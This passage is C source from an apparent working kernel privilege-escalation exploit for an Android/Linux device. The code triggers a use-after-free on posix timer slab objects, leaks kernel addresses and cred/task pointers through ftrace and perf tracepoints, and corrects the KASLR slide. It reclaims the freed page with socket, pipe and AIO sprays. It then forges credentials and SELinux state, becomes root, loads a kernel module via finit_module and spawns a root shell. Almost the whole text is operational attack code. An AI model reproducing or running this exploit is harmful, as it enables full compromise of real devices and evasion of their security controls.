	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	uint64_t base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0xfff);
	unsigned char *buf;
	int ncpu, sent = 0, hit = 0, big = 8 << 20;
	int victim_frees = 0, buddy_frees = 0, order2 = 0;
	uint64_t buddy = base ^ UINT64_C(2);
	if (node_off + 24 > 4096)
		return -1;
	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		return -1;
	memset(buf, 0, 16000);
	for (int page = 0; page < 4; page++) {
		unsigned off = (unsigned)page * 4096u + node_off;
		uint64_t *node;
		if (off + 24 > 16000)
			continue;
		node = (uint64_t *)(buf + off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
		munmap(buf, 16384);
		return -1;
	}
	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[dgram] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < 512; i++) {
		struct timespec pause = { .tv_nsec = 40000000 };
		ssize_t n;
		if ((i % 8) == 0)
			pin_cpu((i / 8) % ncpu);
		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
		if (n == 16000)
			sent++;
		else if (i > 16 && sent > 8)
			break;
		if ((i % 8) == 7)
			nanosleep(&pause, NULL);
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		seek_trace_tail(file);
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX)
				continue;
			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
				if (pfn == base)
					victim_frees++;
				if (pfn == buddy)
					buddy_frees++;
			}
			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
				continue;
			order2++;
			if (base == pfn || base == pfn + 2) {
				hit = 1;
				dprintf(STDOUT_FILENO, "[dgram] hit %s", line);
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[dgram] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
		sent, hit, order2, victim_frees, buddy_frees, buddy);
	quiet_reclaim_trace();
	munmap(buf, 16384);
	return hit ? 0 : -1;
}

static double now_s(void)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC, &t);
	return (double)t.tv_sec + (double)t.tv_nsec / 1e9;
}

/* Choose three timers that (a) sit in the same 8 KB slab and (b) cover three
   different clock bases, so the three drain loops each hit one of them. The
   leak gives us every k_itimer KVA in creation order, and the creation loop
   assigns clock base i%3, so the base of index i is simply i%3. */
static int pick_triple(int total)
{
	/* The very first slab of the cache stays frozen as the cpu_slab and never
	   returns to the buddy (measured: page_freed=0 forever), so only middle
	   slabs are candidates. Start with the slab that held index 1024 -- the
	   one the single-timer build proved frees -- and then sweep the middle
	   half. */
	uint64_t pref = total > 1024 ? g_all[1024] & ~UINT64_C(0x1fff) : 0;
	int lo = total / 3;
	int hi = total - total / 3;
	for (int pass = 0; pass < 2; pass++) {
	for (int i = lo; i < hi; i++) {
		uint64_t slab = g_all[i] & ~UINT64_C(0x1fff);
		int idx[3] = { -1, -1, -1 };
		if (pass == 0 && slab != pref)
			continue;
		/* PLANT_PTR cap_effective needs A's bit16 == 1 (CAP_SYS_MODULE).
		 * A = slab + off with off < 0x2000, so bit16 comes from the slab
		 * base -- preselect bit16 slabs so a reclaim hit lands SYS_MODULE. */
		if ((g_cap_mode || g_want_cap) && !(slab & 0x10000))
			continue;
		for (int j = i; j < total; j++) {
			int b;
			if ((g_all[j] & ~UINT64_C(0x1fff)) != slab)
				break;
			b = j % 3;
			if (idx[b] < 0)
				idx[b] = j;
		}
		if (idx[0] < 0 || idx[1] < 0 || idx[2] < 0)
			continue;
		for (int b = 0; b < 3; b++) {
			g_bases[b] = idx[b];
			g_tile_off[b] = (unsigned)((g_all[idx[b]] + KITIMER_NODE) &
						   0x1fff);
		}
		if (g_cap_mode) {
			g_tile_kind[0] = TILE_NONE;
			g_tile_kind[1] = TILE_NONE;
			g_tile_kind[2] = TILE_CRED2;
		} else {
			g_tile_kind[0] = TILE_CRED;
			g_tile_kind[1] = TILE_SELINUX;
			g_tile_kind[2] = g_want_cap ? TILE_CRED2 : TILE_NONE;
		}
		dprintf(STDOUT_FILENO,
			"[triple] slab=%#" PRIx64 " idx=%d/%d/%d off=%#x/%#x/%#x\n",
			slab, g_bases[0], g_bases[1], g_bases[2], g_tile_off[0],
			g_tile_off[1], g_tile_off[2]);
		return 0;
	}
	}
	return -1;
}


/*
 * SELinux pass: pick an object from a slab whose captured members are all
 * from this child's timer burst.  A random g_all[1024] can share an order-1
 * slab with live system timers, so the slab never returns to the buddy and
 * mm_page_free never fires (page_freed=0).  Empty/full-child slabs do return.
 */
static int pick_clean_timer_slab(int total)
{
	int best_idx = -1, best_count = 0;
	int lo = total / 8, hi = total - total / 8;
	for (int i = lo; i < hi; i++) {
		uint64_t slab = g_all[i] & ~UINT64_C(0x1fff);
		int count = 0;
		for (int j = 0; j < total; j++) {
			if ((g_all[j] & ~UINT64_C(0x1fff)) == slab)
				count++;
		}
		if (count > best_count) {
			best_count = count;
			best_idx = i;
		}
	}
	/* GhostLock slab_own rule: every object in the victim slab must be
	 * owned by this child.  A partial slab can leave the page on a CPU
	 * partial list and never produce mm_page_free. */
	if (best_idx < 0 ||
	    best_count < GEO_POSIX_TIMER_OBJ_PER_SLAB)
		return -1;
	dprintf(STDOUT_FILENO,
		"[slab] clean idx=%d slab=%#" PRIx64 " captured=%d/%d\n",
		best_idx, g_all[best_idx] & ~UINT64_C(0x1fff),
		best_count, total);
	return best_idx;
}


static long g_slab_base_active = -1;
static long g_slab_base_total = -1;

static int slab_posix(long *active, long *total)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char name[64];
	long a, t;
	if (!f)
		return -1;
	while (fscanf(f, "%63s %ld %ld", name, &a, &t) == 3) {
		if (!strcmp(name, "posix_timers_cache")) {
			fclose(f);
			*active = a;
			*total = t;
			return 0;
		}
		/* skip the rest of the line */
		int c;
		while ((c = fgetc(f)) != EOF && c != '\n')
			;
	}
	fclose(f);
	return -1;
}

static int wait_posix_slab_drain(void)
{
	if (g_slab_base_active < 0 || g_slab_base_total < 0) {
		dprintf(STDOUT_FILENO,
			"[slabinfo] unavailable (shell cannot read /proc/slabinfo); skipping drain wait\n");
		return -1;
	}
	for (int i = 0; i < 160; i++) {
		long a = -1, t = -1;
		if (slab_posix(&a, &t) == 0) {
			if (i == 0 || (i % 20) == 0)
				dprintf(STDOUT_FILENO,
					"[slabinfo] baseline=%ld/%ld now=%ld/%ld i=%d\n",
					g_slab_base_active, g_slab_base_total, a, t, i);
			if (a <= g_slab_base_active + 64 &&
			    t <= g_slab_base_total + 64) {
				dprintf(STDOUT_FILENO,
					"[slabinfo] drained strict active=%ld total=%ld\n", a, t);
				return 0;
			}
			if (i >= 120 && a < 1200 && t < 1200) {
				dprintf(STDOUT_FILENO,
					"[slabinfo] drained loose active=%ld total=%ld\n", a, t);
				return 0;
			}
		}
		usleep(50000);
	}
	dprintf(STDOUT_FILENO, "[slabinfo] drain timeout\n");
	return -1;
}

static int one_uaf(uint64_t target)
{
	double t0 = now_s();
	pid_t child;
	int code, status = 0;
	uint64_t ptrs[64];
	int nptr, ntext;
	uint64_t victim;
	g_slab_base_active = -1;
	g_slab_base_total = -1;
	if (slab_posix(&g_slab_base_active, &g_slab_base_total) == 0)
		dprintf(STDOUT_FILENO, "[slabinfo] baseline=%ld/%ld\n",
			g_slab_base_active, g_slab_base_total);
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	ipc->arm_idx[0] = ipc->arm_idx[1] = ipc->arm_idx[2] = -1;
	atomic_store_explicit(&ipc->arm_ready, 0, memory_order_relaxed);
	g_tiles_on = 0;
	child = fork();
	if (child < 0) {
		dprintf(STDOUT_FILENO, "[uaf] victim fork failed errno=%d\n", errno);
		return -1;
	}
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (write_file(TRACE "/buffer_size_kb", "4096\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		dprintf(STDOUT_FILENO, "[uaf] timer trace init failed errno=%d\n", errno);
		kill(child, SIGKILL);
		stop_helpers();
		return -1;
	}
	double t_ready = now_s();
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	double t_timers = now_s();
	write_file(TRACE "/tracing_on", "0\n");
	if (collect_nth(1024, &nptr, &victim)) {
		dprintf(STDOUT_FILENO, "[uaf] timer collection failed errno=%d\n", errno);
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (g_plant_cred && pick_triple(nptr) == 0) {
		g_tiles_on = 1;
		victim = g_all[g_bases[0]];
		ipc->arm_idx[0] = g_bases[0];
		ipc->arm_idx[1] = g_bases[1];
		ipc->arm_idx[2] = g_bases[2];
	} else {
		int clean = pick_clean_timer_slab(nptr);
		int base = clean >= 0 ? clean % 3 : 1024 % 3;
		int idx = clean >= 0 ? clean : 1024;
		ipc->arm_idx[base] = idx;
		if (clean >= 0) {
			victim = g_all[idx];
			dprintf(STDOUT_FILENO,
				"[slab] using clean timer idx=%d victim=%#" PRIx64 "\n",
				idx, victim);
		} else {
			dprintf(STDOUT_FILENO,
				"[triple] single-base pass base=%d (no clean slab)\n",
				base);
		}
	}
	atomic_store_explicit(&ipc->arm_ready, 1, memory_order_release);
	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n"))
		return -1;
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	double t_collect = now_s();
	/* g_cred_kva always names the minted child's real cred; never redirect it
	 * into the reclaimed timer page. */
	/* The killer only sends SIGKILL.  posix_cpu_timers_exit_group() runs in
	 * do_exit(), so the order-1 slab is not free until the child is a zombie.
	 * waitid(WNOWAIT) observes that without reaping, preserving the dangling
	 * node until the page is reclaimed. */
	{
		int pre_status = 0;
		int pre_code = wait_zombie(child, &pre_status);
		dprintf(STDOUT_FILENO,
			"[uaf] pre-reclaim zombie=%d code=%d status=%d\n",
			pre_code != 0, pre_code, pre_status);
	}
	wait_posix_slab_drain();
	g_victim_cpu = g_child_cpu;
	if (reclaim_stream(victim, target)) {
		const char *abort_miss = getenv("PC98260_ABORT_ON_PAGE_MISS");
		if (abort_miss && abort_miss[0] && abort_miss[0] != '0') {
			/* The victim page did not return.  Continuing with
			 * SELinux/task repair would write through a dead UAF and
			 * is the main path that can take the device down. */
			dprintf(STDOUT_FILENO,
				"[uaf] page miss -> hard abort (no further writes)\n");
			stop_helpers();
			exit(80);
		}
		if (!getenv("PC98260_ENABLE_FALLBACK")) {
			dprintf(STDOUT_FILENO, "[uaf] page miss, retry (stream-only)\n");
			stop_helpers();
			return -1;
		}
		dprintf(STDOUT_FILENO,
			"[uaf] stream miss; trying pipe reclaim fallback\n");
		if (!g_ncatch && prepare_catch())
			dprintf(STDOUT_FILENO, "[pipe] prepare failed\n");
		if (reclaim_pipe(victim, target) == 0) {
			dprintf(STDOUT_FILENO, "[uaf] pipe reclaim hit\n");
		} else {
			dprintf(STDOUT_FILENO,
				"[uaf] pipe miss; trying AIO reclaim fallback\n");
			uint64_t aio_target = target;
			if (!aio_target)
				aio_target = slide_addr(SELINUX_LINK) - 7;
			if (reclaim_and_plant(victim, aio_target)) {
				dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
				stop_helpers();
				return -1;
			}
		}
	}
	double t_reclaim = now_s();
	close_socks();
	code = wait_zombie(child, &status);
	/* PORT (R6): wait_zombie returns 0 on its 20 s timeout, which upstream
	 * treated the same as "got a code". A timed-out wait must never fall
	 * through into the blocking waitpid below: if the child is not a zombie
	 * yet, reaping it later would touch a node in an unproven state. Park
	 * instead — a parked parent holds the page and cannot fault. */
	if (code == 0) {
		dprintf(STDOUT_FILENO,
			"[uaf] child not zombie after 20s, parking instead of reaping\n");
		for (;;)
			pause();
	}
	dprintf(STDOUT_FILENO,
		"[t] ready=%.1f timers=%.1f collect=%.1f reclaim=%.1f reap=%.1f total=%.1f\n",
		t_ready - t0, t_timers - t_ready, t_collect - t_timers,
		t_reclaim - t_collect, now_s() - t_reclaim, now_s() - t0);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (waitpid(child, &status, 0) < 0)
		return -1;
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	/* The reclaimed order-1 page is held by the AF_UNIX frag sockets only
	 * until rb_erase has run during reap.  Release it now. */
	close_stream();
	close_socks();
	{
		char eb[8] = { 0 };
		int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
		if (efd >= 0) {
			if (read(efd, eb, 1) < 0)
				eb[0] = 0;
			close(efd);
		}
		dprintf(STDOUT_FILENO, "[uaf] enforce after reap=%c\n",
			eb[0] ? eb[0] : (char)0x3f);
	}
	destroy_rings();
	stop_helpers();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
		return -1;
	}
	return 0;
}

#define MINT_RFD 3
#define MINT_WFD 4

/* Exec-mint a private REAL cred, then keep fixed pipe fds across exec.  The
 * parent leaks that exact cred by child pid and modifies it in place. */
static void cred_child(void)
{
	setpgid(0, 0);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	if (dup2(g_wake[0], MINT_RFD) != MINT_RFD ||
	    dup2(g_report[1], MINT_WFD) != MINT_WFD)
		_exit(4);
	{
		char *const argv[] = {
			(char *)"/proc/self/exe",
			getenv("PC98260_ROOTD") ? (char *)"mintwait-rootd" :
						  (char *)"mintwait", NULL };
		execve("/proc/self/exe", argv, environ);
	}
	_exit(5);
}

/* The exec has committed a private real cred.  On delivery, the earlier
 * PLANT_ZERO made kuid 0, so setuid(0) is accepted without CAP_SETUID and
 * produces a standard root process with cred == real_cred. */
static int mintwait_main(int rootd_mode)
{
	if (write(MINT_WFD, "M", 1) != 1)
		return 6;
	for (;;) {
		unsigned char go;
		if (read(MINT_RFD, &go, 1) != 1)
			return 0;
		if (go == 'k') {
			(void)syscall(SYS_setgid, 0);
			(void)syscall(SYS_setuid, 0);
			(void)syscall(SYS_setfsgid, 0);
			(void)syscall(SYS_setfsuid, 0);
			{
				const char *fko = getenv("PC98260_FINIT_KO");
				if (fko && *fko) {
					const char *pfile = getenv("PC98260_FINIT_PARAMS_FILE");
					char pbuf[256] = "";
					int wfd = -1, w;
					long frc = -1;
					int ferr = 0;
					if (pfile && *pfile) {
						int pfd = open(pfile, O_RDONLY | O_CLOEXEC);
						if (pfd >= 0) {
							ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
							if (pn > 0) {
								pbuf[pn] = 0;
								char *nl = strchr(pbuf, '\n');
								if (nl) *nl = 0;
							}
							close(pfd);
						}
					}
					{
						const char *fready = getenv("PC98260_FINIT_READY");
						for (w = 0; w < 180; w++) {
							if (!fready || !*fready ||
							    access(fready, F_OK) == 0) {
								wfd = open(fko, O_RDONLY | O_CLOEXEC);
								if (wfd >= 0) break;
							}
							sleep(1);
						}
					}
					if (wfd < 0) {
						ferr = errno;
					} else {
						errno = 0;
						frc = syscall(SYS_finit_module, wfd, pbuf, 0);
						ferr = errno;
						close(wfd);
					}
					dprintf(STDOUT_FILENO,
						"[ksu] in-process finit_module rc=%ld errno=%d uid=%u euid=%u\n",
						frc, ferr, getuid(), geteuid());
					if (frc == 0) {
						const char *fe = getenv("PC98260_FINIT_EXIT");
						if (fe && fe[0] == '1') _exit(0);
					}
				}
			}
			if (rootd_mode) {
				/* App runner compatibility only: this is a normal real-cred
				 * process, not a fake-cred page keeper.  Finalize kills the
				 * listener; standalone mode never enters this branch. */
				dprintf(STDOUT_FILENO,
					"[cred] starting temporary real-cred command handoff\n");
				_exit(pc98260_run_rootd());
			}
			{
				char *const av[] = { (char *)"sh", NULL };
				char *const ep[] = {
					(char *)"PATH=/system/bin:/vendor/bin:/data/local/tmp",
					(char *)"HOME=/data/local/tmp", NULL };
				execve("/system/bin/sh", av, ep);
			}
			_exit(0);
		}
		{
			char msg[160];
			int n = snprintf(msg, sizeof(msg),
				"uid=%u euid=%u gid=%u egid=%u\n",
				getuid(), geteuid(), getgid(), getegid());
			(void)write(MINT_WFD, msg, (size_t)n);
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static unsigned long long child_capeff(void)
{
	char path[64], line[256];
	unsigned long long v = 0;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
	FILE *f = fopen(path, "r");
	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f))
		if (!strncmp(line, "CapEff:", 7)) {
			(void)sscanf(line + 7, "%llx", &v);
			break;
		}
	fclose(f);
	return v;
}

static void start_child_ksu(void)
{
	unsigned char go = 'k';
	if (g_wake[1] < 0)
		return;
	if (write(g_wake[1], &go, 1) == 1)
		dprintf(STDOUT_FILENO, "[cred] asked child to take over\n");
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	/* A real-cred child has no forged SELinux blob.  Still use waitpid plus
	 * pipe polling as the liveness signal instead of inferring state from
	 * kill(pid, 0), which remains subject to ordinary SELinux permissions. */
	{
		int st = 0;
		if (waitpid(g_cred_child_pid, &st, WNOHANG) == g_cred_child_pid) {
			dprintf(STDOUT_FILENO,
				"[cred] child %d really exited\n", g_cred_child_pid);
			log_proc_uid(g_cred_child_pid);
			return -1;
		}
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

#define MAX_TASK_CAND 16
static uint64_t g_tasks[MAX_TASK_CAND];
static uint64_t g_tsites[MAX_TASK_CAND];
static int g_ntasks;

/* PORT: task_struct cache objsize 是 slab cache 的取整尺寸
 * （madrid: 5760），不是 sizeof(struct task_struct)（4736）。
 * /proc/slabinfo 对 shell 可读，运行期核对一次，避免换构建后
 * 用错尺寸导致 leak_task 静默"leak failed"。 */
static void slab_task_objsize(void)
{
	char line[512];
	FILE *f = fopen("/proc/slabinfo", "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		unsigned long act, num, objsize;
		if (strncmp(line, "task_struct ", 12))
			continue;
		if (sscanf(line + 12, "%lu %lu %lu", &act, &num, &objsize) == 3 &&
		    objsize > 0) {
			if ((uint64_t)objsize != g_task_obj)
				dprintf(STDOUT_FILENO,
					"[slab] task_struct objsize=%lu (header said %lu), "
					"using live value\n",
					objsize, (unsigned long)g_task_obj);
			g_task_obj = (uint64_t)objsize;
		}
		break;
	}
	fclose(f);
}


#define PERF_PAGES 8
static int perf_open_event(struct perf_event_attr *attr, pid_t pid, int cpu)
{
	return (int)syscall(SYS_perf_event_open, attr, pid, cpu, -1, 0);
}

/* g928: copy_process+0x13c uses kmem_cache_alloc_node_noprof and this kernel
 * has no kmem_cache_alloc_node tracepoint.  Once selinux_state-7 is zeroed,
 * open sched_process_fork and recover the child task from the tracepoint
 * argument registers. */
static int calibrate_slide_from_timers(void)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint64_t link = (uint64_t)TIMER_LINK;
	uint64_t expect_low = link & 0xfff;
	uint64_t deltas[64];
	int nd = 0, ncpu, best_votes = 0;
	uint64_t best_delta = 0;
	timer_t ids[16];
	int made = 0;

	if (!buf)
		return -1;
	write_file(TRACE "/buffer_size_kb", "4096\n");
	trigger_cmd("enable_event:kmem:kmem_cache_alloc\n");
	if (trace_off_on()) {
		free(buf);
		return -1;
	}
	for (int i = 0; i < 16; i++) {
		struct sigevent ev;
		memset(&ev, 0, sizeof(ev));
		ev.sigev_notify = SIGEV_NONE;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &ids[made]) == 0)
			made++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	ncpu = cpu_count();
	for (int c = 0; c < ncpu; c++) {
		if (read_raw_cpu(c, buf, 8U << 20, &used, 0))
			break;
	}
	/* One pass: collect valid timer call sites, then take the majority
	 * delta.  Do not nest a second scan over the whole raw buffer. */
	for (size_t i = 0; i + 32 <= used && nd < 64; i++) {
		uint64_t site, ptr, req;
		memcpy(&site, buf + i, 8);
		if ((site & 0xfff) != expect_low || (site >> 48) != 0xffff)
			continue;
		memcpy(&ptr, buf + i + 8, 8);
		req = kmem_event_req(buf + i, used - i);
		if ((ptr >> 48) != 0xffff || !req)
			continue;
		deltas[nd++] = site - link;
	}
	for (int i = 0; i < made; i++)
		timer_delete(ids[i]);
	free(buf);
	for (int i = 0; i < nd; i++) {
		int votes = 1;
		for (int j = i + 1; j < nd; j++)
			if (deltas[j] == deltas[i])
				votes++;
		if (votes > best_votes) {
			best_votes = votes;
			best_delta = deltas[i];
		}
	}
	if (best_votes < 2) {
		dprintf(STDOUT_FILENO,
			"[slide-cal] no timer call-site votes found (made=%d hits=%d)\n",
			made, nd);
		return -1;
	}
	if (best_delta != g_slide) {
		dprintf(STDOUT_FILENO,
			"[slide-cal] correcting slide %#" PRIx64 " -> %#" PRIx64
			" votes=%d\n", g_slide, best_delta, best_votes);
		g_slide = best_delta;
	} else {
		dprintf(STDOUT_FILENO,
			"[slide-cal] verified slide=%#" PRIx64 " votes=%d\n",
			g_slide, best_votes);
	}
	return 0;
}

static int perf_leak_task(void)
{
	char idbuf[32] = {0};
	int id = -1;
	int idfd = open(TRACE "/events/sched/sched_process_fork/id", O_RDONLY | O_CLOEXEC);
	if (idfd >= 0) {
		ssize_t n = read(idfd, idbuf, sizeof(idbuf) - 1);
		close(idfd);
		if (n > 0)
			id = atoi(idbuf);
	}
	if (id <= 0) {
		dprintf(STDOUT_FILENO, "[task-perf] fork tracepoint id unavailable errno=%d\n", errno);
		return -1;
	}

	struct perf_event_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_TRACEPOINT;
	attr.size = sizeof(attr);
	attr.config = (uint64_t)id;
	attr.sample_period = 1;
	attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_TIME |
			   PERF_SAMPLE_RAW | PERF_SAMPLE_REGS_INTR;
	attr.sample_regs_intr = (1ULL << 0) | (1ULL << 1);
	attr.wakeup_events = 1;
	attr.disabled = 1;
	attr.exclude_hv = 1;
	int pfd = perf_open_event(&attr, 0, -1);
	if (pfd < 0) {
		dprintf(STDOUT_FILENO, "[task-perf] perf_event_open errno=%d id=%d\n", errno, id);
		return -1;
	}

	long ps = sysconf(_SC_PAGESIZE);
	size_t mapsz = (size_t)(PERF_PAGES + 1) * (size_t)ps;
	struct perf_event_mmap_page *meta = mmap(NULL, mapsz, PROT_READ | PROT_WRITE,
						 MAP_SHARED, pfd, 0);
	if (meta == MAP_FAILED || pipe(g_wake) || pipe(g_report)) {
		if (meta != MAP_FAILED) munmap(meta, mapsz);
		close(pfd);
		return -1;
	}
	/* The same child supplies both leaks: sched_process_fork yields its task,
	 * while the subsequent exec mints the real cred captured by kmem. */
	g_cred_site = slide_addr(LINK_ALLOC_CRED);
	if (write_file(TRACE "/buffer_size_kb", "4096\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		munmap(meta, mapsz);
		close(pfd);
		return -1;
	}
	ioctl(pfd, PERF_EVENT_IOC_RESET, 0);
	ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0) {
		munmap(meta, mapsz);
		close(pfd);
		return -1;
	}
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	int mint_ok = 0;
	{
		struct pollfd waitfd = { .fd = g_report[0], .events = POLLIN };
		char ack = 0;
		if (poll(&waitfd, 1, 3000) > 0 &&
		    read(g_report[0], &ack, 1) == 1 && ack == 'M')
			mint_ok = 1;
	}
	if (!mint_ok)
		dprintf(STDOUT_FILENO, "[cred] mint ack missing pid=%d\n",
			g_cred_child_pid);
	write_file(TRACE "/tracing_on", "0\n");
	ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);
	__sync_synchronize();

	uint64_t head = meta->data_head;
	uint64_t tail = meta->data_tail;
	size_t dataoff = meta->data_offset ? meta->data_offset : (size_t)ps;
	size_t datasz = meta->data_size ? meta->data_size : (size_t)PERF_PAGES * (size_t)ps;
	unsigned char *data = (unsigned char *)meta + dataoff;
	uint64_t child_ptr = 0;
	while (tail < head) {
		size_t off = (size_t)(tail % datasz);
		struct perf_event_header h;
		memcpy(&h, data + off, sizeof(h));
		if (h.size < sizeof(h) || off + h.size > datasz)
			break;
		if (h.type == PERF_RECORD_SAMPLE) {
			const unsigned char *p = data + off + sizeof(h);
			const unsigned char *end = data + off + h.size;
			if (p + 8 <= end) {
				uint32_t pid, tid;
				memcpy(&pid, p, 4); p += 4;
				memcpy(&tid, p, 4); p += 4;
			}
			if (p + 8 <= end) p += 8; /* time */
			if (p + 4 <= end) {
				uint32_t rawsz;
				memcpy(&rawsz, p, 4); p += 4;
				if (p + rawsz > end)
					break;
				p += rawsz;
			}
			if (p + 8 <= end) {
				uint64_t abi, x0 = 0, x1 = 0;
				memcpy(&abi, p, 8); p += 8;
				if (p + 8 <= end) { memcpy(&x0, p, 8); p += 8; }
				if (p + 8 <= end) { memcpy(&x1, p, 8); p += 8; }
				dprintf(STDOUT_FILENO,
					"[task-perf] sample id=%d abi=%llu x0=%#" PRIx64 " x1=%#" PRIx64 "\n",
					id, (unsigned long long)abi, (uint64_t)x0, (uint64_t)x1);
				if ((x1 >> 48) == 0xffff && (x1 & 7) == 0 && (x1 & 0xfff) != 0)
					child_ptr = x1;
				else if ((x0 >> 48) == 0xffff && (x0 & 7) == 0 && (x0 & 0xfff) != 0)
					child_ptr = x0;
			}
		}
		tail += h.size;
	}
	meta->data_tail = tail;
	munmap(meta, mapsz);
	close(pfd);
	uint64_t ptrs[32];
	int seen = 0;
	int n = collect_site_pid(g_cred_site, GEO_CRED_SIZE,
		(int)g_cred_child_pid, ptrs, 32, &seen);
	g_selftest_cred += seen;
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
